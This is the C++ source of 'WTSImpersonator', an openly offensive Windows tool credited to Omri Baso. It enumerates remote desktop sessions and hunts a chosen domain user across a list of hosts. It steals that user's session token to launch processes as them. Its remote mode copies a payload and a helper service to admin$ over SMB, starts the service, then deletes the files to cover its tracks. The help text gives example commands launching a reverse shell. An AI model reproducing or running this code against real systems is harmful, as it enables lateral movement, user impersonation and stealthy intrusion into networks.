// WTSImpersonator.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <windows.h>
#include <wtsapi32.h>
#include <userenv.h>
#include <Shlobj.h>
#include <fstream>
#include <sddl.h>
#include <stdio.h>
#include "Utilitis.h"
#pragma comment (lib, "Wtsapi32.lib")
#pragma comment (lib, "Userenv.lib")


void PrintTokenInformation(HANDLE token) {
    DWORD returnLength;
    PTOKEN_USER tokenUser;
    PTOKEN_PRIVILEGES tokenPrivileges;

    // Get the token user.
    GetTokenInformation(token, TokenUser, NULL, 0, &returnLength);
    tokenUser = (PTOKEN_USER)malloc(returnLength);
    GetTokenInformation(token, TokenUser, tokenUser, returnLength, &returnLength);

    // Convert the user SID to a string.
    LPTSTR stringSid;
    ConvertSidToStringSid(tokenUser->User.Sid, &stringSid);

    // Print the user SID.
    std::cout << "User SID: " << stringSid << std::endl;

    char username[256];
    DWORD usernameLen = sizeof(username) / sizeof(char);
    char domain[256];
    DWORD domainLen = sizeof(domain) / sizeof(char);
    SID_NAME_USE sidType;

    if (LookupAccountSidA(NULL, tokenUser->User.Sid, username, &usernameLen, domain, &domainLen, &sidType)) {
        std::cout << "\nUsername: " << domain << "\\" << username << std::endl;
    }

    // Get the token privileges.
    GetTokenInformation(token, TokenPrivileges, NULL, 0, &returnLength);
    tokenPrivileges = (PTOKEN_PRIVILEGES)malloc(returnLength);
    GetTokenInformation(token, TokenPrivileges, tokenPrivileges, returnLength, &returnLength);

    // Print the privileges.
    std::cout << "Privileges:" << std::endl;
    for (DWORD i = 0; i < tokenPrivileges->PrivilegeCount; i++) {
        char privilegeName[256];
        DWORD nameLength = 256;
        if (LookupPrivilegeNameA(NULL, &(tokenPrivileges->Privileges[i].Luid), privilegeName, &nameLength)) {
            std::cout << " - " << privilegeName << std::endl;
        }
    }

    TOKEN_TYPE tokenType;
    DWORD dwReturnLength;
    if (!GetTokenInformation(token, TokenType, &tokenType, sizeof(TOKEN_TYPE), &dwReturnLength))
    {
        printf("GetTokenInformation failed with error code %d\n", GetLastError());
    }

    if (tokenType == TokenPrimary)
    {
        std::cout <<  "[+] Token is TokenPrimary!\n" << std::endl;
    }


    // Cleanup
    LocalFree(stringSid);
    free(tokenUser);
    free(tokenPrivileges);
}


const CHAR* WTSSessionStateToString(WTS_CONNECTSTATE_CLASS state)
{
    switch (state)
    {
    case WTSActive:
        return "WTSActive";
    case WTSConnected:
        return "WTSConnected";
    case WTSConnectQuery:
        return "WTSConnectQuery";
    case WTSShadow:
        return "WTSShadow";
    case WTSDisconnected:
        return "WTSDisconnected";
    case WTSIdle:
        return "WTSIdle";
    case WTSListen:
        return "WTSListen";
    case WTSReset:
        return "WTSReset";
    case WTSDown:
        return "WTSDown";
    case WTSInit:
        return "WTSInit";
    }
    return "INVALID_STATE";
}

BOOL CreateServiceWithSCM(LPSTR lpwsSCMServer, LPSTR lpwsServiceName, LPSTR lpwsServicePath)
{
    std::wcout << TEXT("[+] Will Create Service ") << lpwsServiceName << std::endl;
    SC_HANDLE hSCM;
    SC_HANDLE hService;
    SC_HANDLE hServiceOpen;
   // SERVICE_STATUS ss;
   // GENERIC_WRITE = STANDARD_RIGHTS_WRITE | SC_MANAGER_CREATE_SERVICE | SC_MANAGER_MODIFY_BOOT_CONFIG
    hSCM = OpenSCManagerA(lpwsSCMServer, SERVICES_ACTIVE_DATABASEA, SC_MANAGER_ALL_ACCESS);
    if (hSCM == NULL) {
        std::cout << "[-] OpenSCManager Error: " << GetLastError() << std::endl;
        return -1;
    }

    hService = CreateServiceA(
        hSCM,
        lpwsServiceName,
        lpwsServiceName,
        GENERIC_ALL,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        lpwsServicePath,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL);


    if (hService == NULL) {
        std::cout << "[-] CreateService Error: " << GetLastError() << std::endl;
        return -1;
    }

    std::wcout << TEXT("[+] Create Service Success : ") << lpwsServicePath << std::endl;
    hServiceOpen = OpenServiceA(hSCM, lpwsServiceName, GENERIC_ALL);
    if (hServiceOpen == NULL) {
        std::cout << "[-] OpenService Error: " << GetLastError() << std::endl;
        if (DeleteService(hService))
            std::cout << "\n[+] Deleted Service\n";

        return -1;
    }
    std::cout << "[+] OpenService Success!" << std::endl;

    if (StartServiceA(hServiceOpen, NULL, NULL))
        std::cout << "[+] Started Sevice Sucessfully!\n";

    Sleep(5 * 1000); // 10 Seconds Sleep
    if (DeleteService(hServiceOpen))
        std::cout << "\n[+] Deleted Service\n";

    return 0;
}

BOOL UploadFileBySMB(char* lpwsSrcPath, char* lpwsDstPath)
{
    DWORD dwRetVal;
    dwRetVal = CopyFileA(lpwsSrcPath, lpwsDstPath, FALSE);
    if (dwRetVal)
        std::cout << "[+] Successfully transfered file!\n";
    return dwRetVal > 0 ? TRUE : FALSE;
}


#define _CRT_SECURE_NO_WARNINGS
void ImpersonateExecuteRemote(int SessionId, char* RemoteDekstop, char* AttackFile, char* ServicePathWS ) {

    std::cout << "[+] Trying to execute remotly\n";
    std::string desktop = RemoteDekstop;
    std::string st = "\\\\";

    // Generate Random Names
    std::string ServiceName = Utilitis::generateRandomString();
    std::string AttackerFileName = Utilitis::generateRandomString();

    // Create Paths
    std::string ServicePath = st + desktop + "\\admin$\\" + ServiceName + ".exe";
    std::string AttackerFile = st + desktop + "\\admin$\\" + AttackerFileName + ".exe";

    std::string ServiceExecute = "\"C:\\Windows\\" + ServiceName + ".exe\" " + std::to_string(SessionId) + " " + "C:\\Windows\\" + AttackerFileName + ".exe";

    std::cout << "[+] Transfering file remotely from: " << ServicePathWS << " To: " << ServicePath << "\n";
    std::cout << "[+] Transfering file remotely from: " << AttackFile << " To: " << AttackerFile << "\n";
    if (UploadFileBySMB(ServicePathWS, (char*)ServicePath.c_str())) {
        if (UploadFileBySMB(AttackFile, (char*)AttackerFile.c_str())) {
            std::cout << "[+] Sucessfully Transferred Both Files " << "\n";
            CreateServiceWithSCM(RemoteDekstop, (LPSTR)ServiceName.c_str(), (LPSTR)ServiceExecute.c_str());

            Sleep(12 * 1000); // Sleep 10 Seconds

            if (DeleteFileA(ServicePath.c_str()))
                if (DeleteFileA(AttackerFile.c_str())) {

                    std::cout << "[+] Sucessfully cleaned up files from disk\n";

                }
                else {

                    std::cout << "[-] Error cleaning up files from disk: " << GetLastError() << " \n";
                }

        }
        
    }

    else {

        std::cout << "[-] No Admin Permissions on remote machine" << "\n";

    }


        

}



void ImpersonateExecute(int SessionId, char* RemoteDekstop, char* Command) {

        HANDLE hToken = 0;
        std::cout << "\n[+] Stealing Token\n";
        WTSQueryUserToken(SessionId, &hToken);
        if (!hToken)
            return;

        std::wstring ws(Command, Command + strlen(Command));
        LPCWSTR wCommand = (LPCWSTR)ws.c_str();

        std::cout << "[+] Stole user Token! from sessionsId: " << SessionId << " HANDLE is 0x" << hToken << "\n";

        LPCWSTR PATH = wCommand;//change the path accordingly

        PROCESS_INFORMATION pi;
        STARTUPINFO si;
        DWORD nsid = 1;

        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);

        si.wShowWindow = TRUE;

        PrintTokenInformation(hToken);


        if (CreateProcessAsUserW(hToken, PATH, NULL, NULL,
            NULL, FALSE, 0, NULL, NULL, &si, &pi))
        {
            /* Process has been created; work with the process and wait for it to
            terminate. */
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        }

        CloseHandle(hToken);



 }


int main(int argc, char* argv[])
{

    printf(R"EOF(
 __          _________ _____ _____                                                 _             
 \ \        / /__   __/ ____|_   _|                                               | |            
  \ \  /\  / /   | | | (___   | |  _ __ ___  _ __   ___ _ __ ___  ___  _ __   __ _| |_ ___  _ __ 
   \ \/  \/ /    | |  \___ \  | | | '_ ` _ \| '_ \ / _ \ '__/ __|/ _ \| '_ \ / _` | __/ _ \| '__|
    \  /\  /     | |  ____) |_| |_| | | | | | |_) |  __/ |  \__ \ (_) | | | | (_| | || (_) | |   
     \/  \/      |_| |_____/|_____|_| |_| |_| .__/ \___|_|  |___/\___/|_| |_|\__,_|\__\___/|_|   
                                            | |                                                  
                                            |_|                                                  
         By: Omri Baso                                               
)EOF");

    char* action = {};
    char* ServerName = {};
    DWORD SessionId = {};
    char* Command = {};
    DWORD index, i;
    DWORD count;
    LPSTR pBuffer;
    DWORD bytesReturned;
    BOOL bSuccess;
    char* ServicePathWS = {};
    std::string UserName = {};
    char* IpList = {};

    for (int i = 1; i < argc; ++i)
    {

        if (!strncmp(argv[i], "-h", 3) || !strncmp(argv[i], "--help", 7))
        {

            printf("\n[+] Example Usage:\n\tWTSImpersonator.exe -m enum -s 192.168.40.129");
            
            printf("\n\tWTSImpersonator.exe -m exec-remote -s 192.168.40.129 -id 3 -c C:\\ReverseShell.exe -sp C:\\WTSService.exe");
            printf("\n\tWTSImpersonator.exe -m exec -s 192.168.40.129 -id 3 -c C:\\ReverseShell.exe");
            printf("\n\n[+] Note: the local \"exec\" mode will only work if gets done through PsExec or a service.");

        }

        // enum / exec /exec-remote
        if (!strncmp(argv[i], "-m", 3) || !strncmp(argv[i], "--mode", 7))
        {

            action = argv[++i];
           
        }

        if (!strncmp(argv[i], "-s", 3) || !strncmp(argv[i], "--server", 9))
        {

            ServerName = argv[++i];
           
        }

        if (!strncmp(argv[i], "-sp", 4) || !strncmp(argv[i], "--srcpth", 9))
        {

            ServicePathWS = argv[++i];

        }

        if (!strncmp(argv[i], "-id", 4) || !strncmp(argv[i], "--sessionid", 12))
        {

            SessionId = atoi(argv[++i]);
           
        }

        if (!strncmp(argv[i], "-uh", 4) || !strncmp(argv[i], "--user-hunter", 14))
        {

            UserName = argv[++i];

        }

        if (!strncmp(argv[i], "-ipl", 5) || !strncmp(argv[i], "--ip-list", 10))
        {

            IpList = argv[++i];

        }

        if (!strncmp(argv[i], "-c", 3) || !strncmp(argv[i], "--command", 10))
        {

            Command = argv[++i];

        }


    }

    if (!action)
        return 1;

   



    if (!(strcmp(action, "enum"))) {
            HANDLE hServer = ServerName ? WTSOpenServerA(ServerName) : WTS_CURRENT_SERVER_HANDLE;

            PWTS_SESSION_INFOA pSessionInfo;
    
            bSuccess = WTSEnumerateSessionsA(hServer, 0, 1, &pSessionInfo, &count);

            if (!bSuccess)
            {
                printf("WTSEnumerateSessions failed: %d\n", (int)GetLastError());
                return 0;
            }

            printf("WTSEnumerateSessions count: %d\n", (int)count);

            for (index = 0; index < count; index++) {
                char* Username;
                char* Domain;
                WTS_CONNECTSTATE_CLASS ConnectState;
                PWTS_CLIENT_DISPLAY ClientDisplay;
                PWTS_CLIENT_ADDRESS ClientAddress;
                DWORD sessionId;

                pBuffer = NULL;
                bytesReturned = 0;

                sessionId = pSessionInfo[index].SessionId;

                printf("[%u] SessionId: %u State: %s (%u) WinstationName: '%s'\n",
                    index,
                    pSessionInfo[index].SessionId,
                    WTSSessionStateToString(pSessionInfo[index].State),
                    pSessionInfo[index].State,
                    pSessionInfo[index].pWinStationName);

                if (!WTSQuerySessionInformationA(hServer, sessionId, WTSUserName, &pBuffer, &bytesReturned))
                    return -1;


                Username = (char*)pBuffer;
                printf("\tWTSUserName:  %s\n", Username);

                if (!WTSQuerySessionInformationA(hServer, sessionId, WTSDomainName, &pBuffer, &bytesReturned))
                    return -1;


                Domain = (char*)pBuffer;
                printf("\tWTSDomainName: %s\n", Domain);

                if (!WTSQuerySessionInformationA(hServer, sessionId, WTSConnectState, &pBuffer, &bytesReturned))
                    return -1;

                ConnectState = *((WTS_CONNECTSTATE_CLASS*)pBuffer);
                printf("\tWTSConnectState: %u (%s)\n", ConnectState, WTSSessionStateToString(ConnectState));


                if (!WTSQuerySessionInformationA(hServer, sessionId, WTSClientAddress, &pBuffer, &bytesReturned))
                    return -1;


                ClientAddress = (WTS_CLIENT_ADDRESS*)pBuffer;

                if (AF_INET == ClientAddress->AddressFamily)
                {
                    printf("\tClient Address : %d.%d.%d.%d\n",
                        ClientAddress->Address[2], ClientAddress->Address[3], ClientAddress->Address[4], ClientAddress->Address[5]);
                }


        }
   
    }

    if (!(strcmp(action, "user-hunter"))) {
    
        std::string SAMAccoutNAME = UserName.substr(UserName.find("/")+1, UserName.length()-1);
        std::string Doamin = UserName.substr(0, UserName.find("/"));
        DWORD count2;

        std::cout << "\n[+] Hunting for: " << Doamin << "/" << SAMAccoutNAME << " On list: " << IpList << "\n" ;
        std::ifstream input(IpList);
        for (std::string line; getline(input, line); )
        {
            char* OutBuffer = {};
            std::cout << "[-] Trying: " << line << "\n";
            HANDLE hServer = WTSOpenServerA((LPSTR)line.c_str());
            PWTS_SESSION_INFOA pSessionInfo2;
            if (!hServer)
                continue;

            std::cout << "[+] Opned WTS Handle: " << line << "\n";
            std::string Username = {};
            std::string DomainReceived = {};
            bSuccess = WTSEnumerateSessionsA(hServer, 0, 1, &pSessionInfo2, &count2);
            if (bSuccess) {

                for (index = 0; index < count2; index++) {
                    DWORD sessionId = pSessionInfo2[index].SessionId;

                    if (!WTSQuerySessionInformationA(hServer, sessionId, WTSUserName, &OutBuffer, &bytesReturned))
                        return -1;


                    Username = (char*)OutBuffer;
                  


                    if (!WTSQuerySessionInformationA(hServer, sessionId, WTSDomainName, &OutBuffer, &bytesReturned))
                        return -1;


                    DomainReceived = (char*)OutBuffer;
                

                    if (Username == SAMAccoutNAME) {
                        if (Doamin == DomainReceived) {
                            std::cout << "\n----------------------------------------\n";
                            std::cout << "[+] Found User: " << Doamin << "/" << SAMAccoutNAME << " On Server: " << line << "\n";
                            std::cout << "[+] Getting Code Execution as: " << Doamin << "/" << SAMAccoutNAME << "\n";
                            ImpersonateExecuteRemote(sessionId, (char*)line.c_str(), Command, ServicePathWS);
                            break;


                        }


                    }


                }
            }
            


        }
    }

   

    if (!(strcmp(action, "exec"))) {
        
        HANDLE hToken = 0;
        ZeroMemory(&hToken, sizeof(HANDLE));
        
        ImpersonateExecute(SessionId, ServerName, Command);
    }

    if (!(strcmp(action, "exec-remote"))) {

        std::cout << "[+] Selected Exec remote\n";
        HANDLE hToken = 0;
        ZeroMemory(&hToken, sizeof(HANDLE));

        ImpersonateExecuteRemote(SessionId, ServerName, Command, ServicePathWS);
    }


}


//std::string GetLastErrorAsString()
//{
//    //Get the error message ID, if any.
//    DWORD errorMessageID = ::GetLastError();
//    if (errorMessageID == 0) {
//        return std::string(); //No error message has been recorded
//    }
//
//    LPSTR messageBuffer = nullptr;
//
//    //Ask Win32 to give us the string version of that message ID.
//    //The parameters we pass in, tell Win32 to create the buffer that holds the message for us (because we don't yet know how long the message string will be).
//    size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
//        NULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);
//
//    //Copy the error message into a std::string.
//    std::string message(messageBuffer, size);
//
//    //Free the Win32's string's buffer.
//    LocalFree(messageBuffer);
//
//    return message;
//
//
//}


